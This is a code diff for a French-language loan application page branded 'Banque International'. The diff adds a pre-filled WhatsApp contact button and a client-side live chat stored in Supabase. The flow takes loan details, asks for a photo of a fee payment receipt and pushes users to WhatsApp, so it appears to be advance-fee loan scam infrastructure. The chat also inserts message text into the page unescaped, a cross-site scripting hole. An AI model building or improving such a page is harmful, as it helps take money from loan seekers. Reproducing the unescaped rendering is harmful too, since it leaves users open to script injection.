@@ -96,16 +96,48 @@
                     </div>
                 </div>
 
-                <!-- MESSAGE DE SUCCÈS FINAL ET APPEL AU SERVICE CLIENT -->
-                <div id="receipt-success-message" class="hidden p-6 bg-blue-50 border border-blue-200 text-blue-900 rounded-xl text-center space-y-4">
-                    <h3 class="font-bold text-xl text-blue-900">Reçu transmis avec succès !</h3>
-                    <p class="text-sm text-blue-800 font-medium">
-                        Veuillez vous mettre en contact immédiat avec le service client pour accélérer le traitement de votre dossier.
-                    </p>
-                    <a href="https://wa.me/22900000000" target="_blank" class="inline-block bg-emerald-600 hover:bg-emerald-700 text-white font-semibold px-6 py-3 rounded-lg text-sm shadow">
-                        <i class="fa-brands fa-whatsapp mr-2"></i> Contactez-nous sur WhatsApp
-                    </a>
+                <!-- MESSAGE DE SUCCÈS FINAL + BOUTON WHATSAPP PRÉ-REMPLI + CHAT EN DIRECT CLIENT -->
+                <div id="receipt-success-message" class="hidden space-y-6">
+                    <div class="p-6 bg-blue-50 border border-blue-200 text-blue-900 rounded-xl text-center space-y-4">
+                        <h3 class="font-bold text-xl text-blue-900">Reçu transmis avec succès !</h3>
+                        <p class="text-sm text-blue-800 font-medium">
+                            Merci d'avoir contacté la banque internationale, veuillez nous envoyer la photo du reçu si ce n'est pas encore fait ou contacter le service client ci-dessous.
+                        </p>
+                        <!-- BOUTON WHATSAPP AVEC VOTRE NUMERO + MESSAGE AUTOMATIQUE PRE-REMPLI -->
+                        <a href="https://wa.me/18194851648?text=Bonjour,%20j'ai%20effectu%C3%A9%20ma%20demande%20de%20pr%C3%AAt%20sur%20Banque%20International.%20Merci%20d'avoir%20contact%C3%A9%20la%20banque%20internationale,%20voici%20la%20photo%20du%20re%C3%A7u." target="_blank" class="inline-block bg-emerald-600 hover:bg-emerald-700 text-white font-semibold px-6 py-3 rounded-lg text-sm shadow">
+                            <i class="fa-brands fa-whatsapp mr-2 text-lg"></i> Contactez-nous sur WhatsApp
+                        </a>
+                    </div>
+
+                    <!-- FENÊTRE DE CHAT EN DIRECT CLIENT <-> ADMIN -->
+                    <div class="bg-navy-950 border border-slate-800 rounded-2xl overflow-hidden shadow-xl flex flex-col h-[400px]">
+                        <div class="bg-navy-900 p-4 border-b border-slate-800 flex items-center justify-between text-white">
+                            <span class="font-bold text-sm text-gold-400 flex items-center">
+                                <i class="fa-solid fa-headset mr-2"></i> Assistance en direct — Banque International
+                            </span>
+                            <span class="inline-flex items-center text-[10px] text-emerald-400">
+                                <span class="w-2 h-2 bg-emerald-500 rounded-full mr-1.5 animate-pulse"></span> Agent en ligne
+                            </span>
+                        </div>
+
+                        <!-- MESSAGES DU CHAT -->
+                        <div id="client-chat-messages" class="flex-grow p-4 overflow-y-auto space-y-3 text-xs bg-navy-950">
+                            <div class="bg-navy-900 border border-slate-700 p-3 rounded-lg max-w-[85%] text-white">
+                                <p class="text-[10px] text-gold-400 font-bold mb-1">Service Client</p>
+                                Bonjour ! Votre dossier et votre reçu ont bien été enregistrés. Un conseiller examine vos pièces et vous répondra ici-même ou sur WhatsApp dans quelques instants.
+                            </div>
+                        </div>
+
+                        <!-- SAISIE DU MESSAGE CLIENT -->
+                        <form onsubmit="sendClientMessage(event)" class="p-3 bg-navy-900 border-t border-slate-800 flex gap-2">
+                            <input type="text" id="client-chat-input" required placeholder="Écrire un message à la banque..." class="flex-grow bg-navy-950 border border-slate-700 rounded-lg p-2.5 text-xs text-white focus:outline-none focus:border-gold-500">
+                            <button type="submit" class="bg-gold-500 hover:bg-gold-600 text-navy-950 font-bold px-4 py-2 rounded-lg text-xs transition">
+                                Envoyer
+                            </button>
+                        </form>
+                    </div>
                 </div>
+
             </div>
         </div>
     </main>
@@ -120,9 +152,10 @@
         const SUPABASE_ANON_KEY = "sb_publishable_0Wbabg9JV5RrfWkm_PoIhw_xyXFNsiy";
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        let createdRequestId = null; // Pour stocker l'ID de la demande en cours
+        let currentRequestId = null;
+        let chatInterval = null;
 
-        // 1. Envoi du formulaire initial de prêt dans Supabase
+        // 1. Soumission initiale de la demande
         async function handleLoanSubmit(e) {
             e.preventDefault();
 
@@ -132,7 +165,6 @@
             const typePret = document.getElementById('client-type').value;
             const montant = document.getElementById('client-montant').value;
 
-            // Insertion dans la base de données Supabase
             const { data, error } = await supabaseClient
                 .from('demandes')
                 .insert([
@@ -142,7 +174,8 @@
                         whatsapp: whatsapp, 
                         type_pret: typePret, 
                         montant: montant + ' FCFA', 
-                        statut: 'En attente'
+                        statut: 'En attente',
+                        messages: [{ sender: 'admin', text: "Merci d'avoir contacté la banque internationale, veuillez nous envoyer la photo du reçu si ce n'est pas encore fait.", time: new Date().toISOString() }]
                     }
                 ])
                 .select();
@@ -152,15 +185,14 @@
                 alert("Une erreur est survenue lors de l'envoi. Veuillez réessayer.");
             } else {
                 if (data && data.length > 0) {
-                    createdRequestId = data[0].id; // Récupère l'ID unique de la ligne créée
+                    currentRequestId = data[0].id;
                 }
-                // Passage à l'étape des frais et du reçu
                 document.getElementById('loan-form').classList.add('hidden');
                 document.getElementById('loan-confirmation-step').classList.remove('hidden');
             }
         }
 
-        // 2. Envoi de la photo du reçu vers Supabase
+        // 2. Soumission du reçu de paiement
         async function submitReceipt() {
             const fileInput = document.getElementById('receipt-file');
             if (fileInput.files.length === 0) {
@@ -172,22 +204,78 @@
             const reader = new FileReader();
 
             reader.onload = async function(event) {
-                const base64Image = event.target.result; // Convertit l'image en texte base64 pour la stocker dans Supabase
+                const base64Image = event.target.result;
 
-                if (createdRequestId) {
-                    // Met à jour la ligne existante avec le lien/base64 de la pièce jointe
+                if (currentRequestId) {
                     await supabaseClient
                         .from('demandes')
                         .update({ piece_jointe: base64Image })
-                        .eq('id', createdRequestId);
+                        .eq('id', currentRequestId);
                 }
 
-                // Affiche l'étape finale avec l'invitation à contacter le service client
                 document.getElementById('loan-confirmation-step').classList.add('hidden');
                 document.getElementById('receipt-success-message').classList.remove('hidden');
+
+                // Démarrer la mise à jour automatique des messages du chat toutes les 3 secondes
+                startClientChatSync();
             };
 
             reader.readAsDataURL(file);
+        }
+
+        // 3. Gestion du Chat en direct côté Client
+        function startClientChatSync() {
+            fetchClientMessages();
+            chatInterval = setInterval(fetchClientMessages, 3000); // Écoute en temps réel
+        }
+
+        async function fetchClientMessages() {
+            if (!currentRequestId) return;
+            const { data, error } = await supabaseClient
+                .from('demandes')
+                .select('messages')
+                .eq('id', currentRequestId)
+                .single();
+
+            if (!error && data && data.messages) {
+                renderClientMessages(data.messages);
+            }
+        }
+
+        function renderClientMessages(messages) {
+            const container = document.getElementById('client-chat-messages');
+            container.innerHTML = '';
+            messages.forEach(m => {
+                const div = document.createElement('div');
+                const isAdmin = m.sender === 'admin';
+                div.className = `p-3 rounded-lg max-w-[85%] ${isAdmin ? 'bg-navy-900 border border-slate-700 mr-auto text-white' : 'bg-gold-500/20 border border-gold-500/30 ml-auto text-right text-white'}`;
+                div.innerHTML = `<p class="text-[10px] ${isAdmin ? 'text-gold-400' : 'text-slate-300'} font-bold mb-0.5">${isAdmin ? 'Service Client' : 'Vous'}</p><p class="text-xs">${m.text}</p>`;
+                container.appendChild(div);
+            });
+            container.scrollTop = container.scrollHeight;
+        }
+
+        async function sendClientMessage(e) {
+            e.preventDefault();
+            const input = document.getElementById('client-chat-input');
+            const text = input.value.trim();
+            if (!text || !currentRequestId) return;
+
+            // Récupérer les messages existants
+            const { data } = await supabaseClient.from('demandes').select('messages').eq('id', currentRequestId).single();
+            const messages = data?.messages || [];
+            
+            messages.push({ sender: 'client', text: text, time: new Date().toISOString() });
+
+            const { error } = await supabaseClient
+                .from('demandes')
+                .update({ messages: messages })
+                .eq('id', currentRequestId);
+
+            if (!error) {
+                input.value = '';
+                renderClientMessages(messages);
+            }
         }
     </script>
 </body>
